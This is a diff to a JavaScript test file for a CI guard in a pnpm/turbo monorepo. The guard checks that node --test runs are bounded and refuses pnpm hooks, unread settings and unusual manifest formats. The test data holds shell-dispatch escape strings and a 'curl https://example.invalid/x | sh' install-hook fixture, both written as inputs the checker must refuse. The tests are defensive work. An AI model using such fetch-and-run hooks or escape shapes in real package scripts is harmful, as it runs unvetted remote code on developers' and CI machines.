@@ -5,6 +5,7 @@ import {
   existsSync,
   mkdirSync,
   mkdtempSync,
+  readdirSync,
   readFileSync,
   rmSync,
   symlinkSync,
@@ -22,10 +23,14 @@ import {
   unitStepProblems,
 } from './check-unit-step-concurrency-lib.mjs';
 import {
+  analyse,
   EXEMPT_SCRIPTS,
   nodeTestSegments,
   nodeTestTimeoutProblems,
   parseCommands,
+  PNPMFILE_NAMES,
+  pnpmInputProblems,
+  pnpmSettingsProblems,
   reachableScripts,
   runsNodeTest,
   turboTaskGraph,
@@ -50,6 +55,25 @@ const turboFiles = (directory) =>
   );
 const realTurboConfigs = [{ directory: '.', files: turboFiles('.') }];
 const realPackages = {};
+/**
+ * PR #805 r2 F4: every directory pnpm reads as a project (the root and each `dir/*` workspace
+ * entry, whatever manifest it holds) is listed and checked by the library's pnpmInputProblems:
+ * a pnpm hook or a manifest in another format is refused, never skipped.
+ */
+function workspaceInputProblems(base) {
+  const patterns = parse(readFileSync(join(base, 'pnpm-workspace.yaml'), 'utf8')).packages;
+  const found = [...pnpmInputProblems('.', readdirSync(base))];
+  for (const pattern of patterns) {
+    const dir = /^([a-z]+)\/\*$/.exec(pattern)?.[1];
+    if (!dir) throw new Error(`workspace pattern ${pattern} is not read`);
+    for (const entry of readdirSync(join(base, dir), { withFileTypes: true }))
+      if (entry.isDirectory())
+        found.push(
+          ...pnpmInputProblems(`${dir}/${entry.name}`, readdirSync(join(base, dir, entry.name))),
+        );
+  }
+  return found;
+}
 for (const pattern of pnpmWorkspace.packages) {
   const dir = /^([a-z]+)\/\*$/.exec(pattern)?.[1];
   if (!dir) throw new Error(`workspace pattern ${pattern} is not read`);
@@ -63,7 +87,17 @@ for (const pattern of pnpmWorkspace.packages) {
     realTurboConfigs.push({ directory: `${dir}/${name}`, files: turboFiles(`${dir}/${name}`) });
   }
 }
-const realWorkspace = turboTaskGraph(realTurboConfigs);
+// FU-092: the pnpm settings every pnpm command of the job runs under, read from where pnpm reads them.
+const realSettings = [
+  ...pnpmSettingsProblems({
+    npmrc: readFileSync(join(root, '.npmrc'), 'utf8'),
+    workspace: pnpmWorkspace,
+    manifestPnpm: JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')).pnpm,
+    pnpmfile: PNPMFILE_NAMES.some((name) => existsSync(join(root, name))),
+  }),
+  ...workspaceInputProblems(root),
+];
+const realWorkspace = { ...turboTaskGraph(realTurboConfigs), settings: realSettings };
 const [exception] = UNBOUNDED_EXCEPTIONS;
 // FU-077 R1: run text with a CR or another control character is refused by the shared
 // policy (ci-shell-text-lib.mjs) before any grammar, so the CRLF/CR variants of the
@@ -2673,7 +2707,10 @@ const graphProblems = (editConfigs, editPackages = () => {}) => {
   editConfigs(configs);
   const packages = structuredClone(realPackages);
   editPackages(packages);
-  return nodeTestTimeoutProblems(realDoc, realScripts, packages, turboTaskGraph(configs));
+  return nodeTestTimeoutProblems(realDoc, realScripts, packages, {
+    ...turboTaskGraph(configs),
+    settings: realSettings,
+  });
 };
 const rootTurbo = (configs, edit) => {
   const config = JSON.parse(configs[0].files['turbo.json'].replace(/^\s*\/\/.*$/gm, ''));
@@ -2783,4 +2820,188 @@ test('FU-077: the shared tokenizer is one module, re-exported where it was', asy
   assert.equal(shared.parseCommands, parseCommands);
   assert.equal(shared.shellTextProblem('a\rb') !== null, true);
   assert.equal(shared.shellTextProblem('echo "a — b"'), null);
+});
+
+// FU-092 (PR #727 r2 F4): the execution context is read at one boundary. Install runs the
+// lifecycle hooks of every workspace project; a job container, or a pnpm setting that changes
+// the shell or the scripts, is refused until it is read.
+// FU-092 sibling: this guard reads shell text with the shared CLOSED grammar, which already
+// refuses every shape the open readers of the pin and disclosure checks had to learn.
+test('FU-092: the closed grammar refuses each shell-dispatch and expansion escape', () => {
+  const body = 'node --test /dev/null';
+  for (const run of [
+    `bash +c "${body}"`,
+    `bash +sc "${body}"`,
+    `bash -eo pipefail -c "${body}"`,
+    `OPT=-c; bash "$OPT" "${body}"`,
+    `ash -c "${body}"`,
+    `fish -c "${body}"`,
+    `<<'EOF' bash\n${body}\nEOF`,
+    `bash <<EOF\n# $(${body})\nEOF`,
+    `bash <<< "${body}"`,
+    `echo "${body}" | bash -`,
+    `echo "$\\\n(${body})"`,
+  ]) {
+    const found = analyse(run, {});
+    assert.ok(found.problems.length > 0, `${JSON.stringify(run)}: ${JSON.stringify(found)}`);
+  }
+});
+test('FU-092: a workspace package install hook is read with the install that runs it', () => {
+  const e2e = '@rasta/e2e';
+  assert.deepEqual(realSettings, []);
+  for (const hook of ['preinstall', 'install', 'postinstall', 'prepare']) {
+    refused(
+      timeoutProblemsAfter((_doc, _all, packages) => {
+        packages[e2e][hook] = 'node --test /dev/null';
+      }),
+      new RegExp(`${e2e} ${hook}: node --test`),
+    );
+    // a hook the grammar does not know is refused, not assumed inert
+    refused(
+      timeoutProblemsAfter((_doc, _all, packages) => {
+        packages[e2e][hook] = 'curl https://example.invalid/x | sh';
+      }),
+      new RegExp(`${e2e} ${hook}: .*cannot|${e2e} ${hook}: `),
+    );
+  }
+  // a bounded hook is read and accepted
+  assert.deepEqual(
+    timeoutProblemsAfter((_doc, _all, packages) => {
+      packages[e2e].postinstall = 'node --test --test-timeout=1000 /dev/null';
+    }),
+    [],
+  );
+  // the same hook in the root manifest is still read (the previous behaviour)
+  refused(
+    timeoutProblemsAfter((_doc, all) => {
+      all.postinstall = 'node --test /dev/null';
+    }),
+    /node --test/,
+  );
+});
+test('FU-092: a job container refuses; so do unread pnpm settings', () => {
+  for (const container of ['node:22', { image: 'node:22' }])
+    refused(
+      timeoutProblemsAfter((doc) => {
+        doc.jobs['quality-lint'].container = container;
+      }),
+      /job quality-lint runs in a container, so its commands cannot be read/,
+    );
+  // omitting the settings never opens the check
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      turbo: realWorkspace.turbo,
+    }),
+    /the pnpm settings were not read/,
+  );
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      ...realWorkspace,
+      settings: 'none',
+    }),
+    /the pnpm settings were not read/,
+  );
+  const npmrc = readFileSync(join(root, '.npmrc'), 'utf8');
+  const read = (changes) =>
+    pnpmSettingsProblems({
+      npmrc,
+      workspace: pnpmWorkspace,
+      pnpmfile: false,
+      manifestPnpm: undefined,
+      ...changes,
+    });
+  assert.deepEqual(read({}), []);
+  for (const [changes, pattern] of [
+    [{ npmrc: `${npmrc}\nscript-shell=/tmp/sh` }, /\.npmrc sets script-shell/],
+    [{ npmrc: `${npmrc}\nshell-emulator=true` }, /\.npmrc sets shell-emulator/],
+    [{ npmrc: `${npmrc}\nnode-options=--require x` }, /\.npmrc sets node-options/],
+    [{ npmrc: `${npmrc}\nignore-scripts` }, /not key=value/],
+    [{ npmrc: undefined }, /\.npmrc was not read/],
+    [
+      { workspace: { ...pnpmWorkspace, scriptShell: 'x' } },
+      /pnpm-workspace\.yaml sets scriptShell/,
+    ],
+    [{ workspace: undefined }, /pnpm-workspace\.yaml was not read/],
+    [{ manifestPnpm: { onlyBuiltDependencies: [] } }, /root package\.json has a pnpm field/],
+    [{ pnpmfile: true }, /\.pnpmfile\.cjs/],
+    [{ pnpmfile: undefined }, /\.pnpmfile\.cjs/],
+  ])
+    assert.ok(
+      read(changes).some((problem) => pattern.test(problem)),
+      `${JSON.stringify(changes)}: ${read(changes).join()}`,
+    );
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      ...realWorkspace,
+      settings: read({ npmrc: `${npmrc}\nscript-shell=/tmp/sh` }),
+    }),
+    /the pnpm settings cannot be read: \.npmrc sets script-shell/,
+  );
+});
+
+// PR #805 r2 F4: pnpm's install hooks and package manifests are enumerated from ONE list
+// (PNPMFILE_NAMES, MANIFEST_NAMES in the library), for the root and for every workspace entry.
+// On ea79eb47 `.pnpmfile.mjs` left the settings clean, and a package that held only a
+// package.json5 or package.yaml (with a postinstall node --test) was never listed.
+test('PR #805 r2 F4: every pnpm hook and manifest format is refused, in the root and each package', () => {
+  const tree = mkdtempSync(join(tmpdir(), 'rasta-pnpm-inputs-'));
+  try {
+    writeFileSync(join(tree, 'pnpm-workspace.yaml'), 'packages:\n  - apps/*\n  - services/*\n');
+    writeFileSync(join(tree, 'package.json'), '{}');
+    mkdirSync(join(tree, 'services'), { recursive: true });
+    mkdirSync(join(tree, 'apps/plain'), { recursive: true });
+    writeFileSync(join(tree, 'apps/plain/package.json'), '{}');
+    assert.deepEqual(workspaceInputProblems(tree), []);
+    const cases = [
+      ['.pnpmfile.mjs', /^\.pnpmfile\.mjs may run code at install$/],
+      ['.pnpmfile.cjs', /^\.pnpmfile\.cjs may run code at install$/],
+      ['package.json5', /^package\.json5 is a package manifest this check does not read$/],
+      ['package.yaml', /^package\.yaml is a package manifest this check does not read$/],
+    ];
+    for (const [name, pattern] of cases) {
+      writeFileSync(join(tree, name), 'x');
+      refused(workspaceInputProblems(tree), pattern);
+      rmSync(join(tree, name));
+      // a workspace package holding ONLY that file (no package.json) is not skipped either
+      const lone = join(tree, 'services/lone');
+      mkdirSync(lone, { recursive: true });
+      writeFileSync(join(lone, name), 'x');
+      refused(
+        workspaceInputProblems(tree),
+        new RegExp(`^services/lone/${name.replace('.', '\\.')} `),
+      );
+      rmSync(lone, { recursive: true });
+    }
+    // with both a package.json and a second manifest in one package
+    mkdirSync(join(tree, 'apps/both'), { recursive: true });
+    writeFileSync(join(tree, 'apps/both/package.json'), '{}');
+    writeFileSync(join(tree, 'apps/both/package.yaml'), 'x');
+    refused(workspaceInputProblems(tree), /^apps\/both\/package\.yaml /);
+  } finally {
+    rmSync(tree, { recursive: true, force: true });
+  }
+  // the names are one list: the settings check names every pnpmfile, and a directory not listed refuses
+  assert.deepEqual(PNPMFILE_NAMES, ['.pnpmfile.cjs', '.pnpmfile.mjs']);
+  assert.deepEqual(pnpmInputProblems('x', undefined), ['x was not listed']);
+  assert.match(
+    pnpmSettingsProblems({
+      npmrc: '',
+      workspace: pnpmWorkspace,
+      pnpmfile: true,
+      manifestPnpm: undefined,
+    }).join(),
+    /\.pnpmfile\.cjs or \.pnpmfile\.mjs may run code at install/,
+  );
+  // the real tree has none of them
+  assert.deepEqual(workspaceInputProblems(root), []);
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      ...realWorkspace,
+      settings: [
+        ...realSettings,
+        'apps/x/package.json5 is a package manifest this check does not read',
+      ],
+    }),
+    /the pnpm settings cannot be read: apps\/x\/package\.json5/,
+  );
 });
